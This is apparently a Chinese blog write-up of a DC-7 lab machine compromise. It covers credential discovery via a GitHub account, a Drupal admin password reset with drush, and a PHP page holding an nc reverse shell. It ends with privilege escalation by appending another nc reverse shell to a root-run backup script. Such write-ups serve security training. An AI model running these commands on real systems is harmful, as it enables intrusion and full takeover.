---
title: DC_7靶机渗透测试 
date: 2020-09-14 14:06
swiper: false # 将改文章放入轮播图中
swiperImg: '' # 该文章在轮播图中的图片，可以是本地目录下图片也可以是http://xxx图片
img: 'http://cdn.mxrblog.cn/ct_3.jpg' # 该文章图片，可以是本地目录下图片也可以是http://xxx图片
categories: 渗透测试
tags: [渗透测试, DC]   # 可以是数组
top: false



---

# DC_7靶机渗透测试

## 一、信息收集

- 扫描主机并查看开放了哪些端口

![image-20210704200627247](http://cdn.mxrblog.cn/image-20210704200627247.png)

- 进入靶机页面

![image-20210704200224803](http://cdn.mxrblog.cn/image-20210704200224803.png)

- 根据上面所说，我们会在这次实验中获得新的知识，这不全是关于技术方面的，还有一些其他的，如果我们非要使用字典暴力破解，我们可能会得到失败的结果。
- 所以按照提示所说，我们注意到outside the box，也就是文字框之外的东西，注意到下面有个@DC7USER，尝试在这上面下功法

![image-20210704195910291](http://cdn.mxrblog.cn/image-20210704195910291.png)

- Google一下，看看是否有神奇的事情发生

![image-20210704200939048](http://cdn.mxrblog.cn/image-20210704200939048.png)

- 打开这个DcUser的仓库，看看有什么值得我们挖掘的

![image-20210704201412676](http://cdn.mxrblog.cn/image-20210704201412676.png)

![image-20210704201446429](http://cdn.mxrblog.cn/image-20210704201446429.png)

- 我们发现的一个数据库的账号密码，尝试用这个数据库的账号密码进行ssh远程登录连接**(万事成功皆始于尝试！！！)**

![image-20210704201944625](http://cdn.mxrblog.cn/image-20210704201944625.png)

- 查看一下都有啥，发现一封新邮件，于是查看这封邮件，只发现给了一个 /opt/scripts/backups.sh

![image-20210704202527016](http://cdn.mxrblog.cn/image-20210704202527016.png)

- 运行一下这个文件看看会有什么情况发生，但是发现知只是运行了一下备份程序

![image-20210704202842039](http://cdn.mxrblog.cn/image-20210704202842039.png)

- 查看一下这个备份文件的内容，发现命令drush，通过这个命令我们可以修改Drupal的后台管理员admin的密码

![image-20210704203131035](http://cdn.mxrblog.cn/image-20210704203131035.png)

```
运行 drush user-password someuser --password="password" 命令重设用户密码。

drush user-password admin --password="123"
```

- 运行的时候发现报错，说运行环境必须是Drupal环境，于是我们进入/var/www/html 进行运行

![image-20210704204351108](http://cdn.mxrblog.cn/image-20210704204351108.png)

- 用修改过的密码登录

![image-20210704205049268](http://cdn.mxrblog.cn/image-20210704205049268.png)

- 为了能够反弹shell，我们下载php插件，这个在durpal7里面是自带的，但是版本8为了安全起见需要用户自行安装

- 安装链接为： 

```
https://ftp.drupal.org/files/projects/php-8.x-1.0.tar.gz
```

![image-20210704210039029](http://cdn.mxrblog.cn/image-20210704210039029.png)

![image-20210704205822856](http://cdn.mxrblog.cn/image-20210704205822856.png)

![image-20210704205940056](http://cdn.mxrblog.cn/image-20210704205940056.png)

![image-20210704210114085](http://cdn.mxrblog.cn/image-20210704210114085.png)

![image-20210704210415079](http://cdn.mxrblog.cn/image-20210704210415079.png)

- 在Content栏选择Welcome to DC-7 进行页面编辑

![image-20210704210651960](http://cdn.mxrblog.cn/image-20210704210651960.png)

- 编辑页面，用过php进行反弹shell

```
<?php system('nc -e /bin/bash 192.168.1.8 4444')?>
```

![image-20210704212041999](http://cdn.mxrblog.cn/image-20210704212041999.png)

- 回到Welcome to DC-7页面浏览后(刷新)，在攻击机器nc开启4444端口进行监听

![image-20210704212209875](http://cdn.mxrblog.cn/image-20210704212209875.png)

- 获取交互式shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

![image-20210704212311287](http://cdn.mxrblog.cn/image-20210704212311287.png)

- 发现文件/opt/scripts/backups.sh是以root身份执行的

![image-20210704213029372](http://cdn.mxrblog.cn/image-20210704213029372.png)

- 向该文件中写入反弹shell命令， 反弹到我们的攻击机器上

```
echo "nc -e /bin/bash 192.168.1.8 6666" >> backups.sh
```

- 攻击机器打开6666号端口，nc进行流量监听

![image-20210704220139504](http://cdn.mxrblog.cn/image-20210704220139504.png)

